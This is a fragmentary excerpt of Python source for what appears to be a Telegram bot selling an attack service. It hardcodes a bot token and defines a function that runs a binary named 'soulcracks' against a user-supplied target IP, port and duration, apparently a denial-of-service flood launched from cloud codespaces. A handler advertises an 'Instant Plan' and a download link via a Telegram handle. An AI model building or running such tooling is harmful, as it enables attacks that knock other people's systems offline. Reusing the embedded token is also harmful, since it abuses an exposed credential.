...
TOKEN = '7167969576:AAEtpn-vvfOe5kiQzOFeJVCJm_3fUjNhUUY'
...
async def run_attack_command_on_codespace(target_ip, target_port, duration):
    command = f"./soulcracks {target_ip} {target_port} {duration} 101"
    try:
...
def handle_message(message):
    ...
    if message.text == "Instant Plan 🧡":
        ...
        bot.send_message(message.chat.id, "*Please use the following link for Canary Download: @Shaeep43*", parse_mode='Markdown')
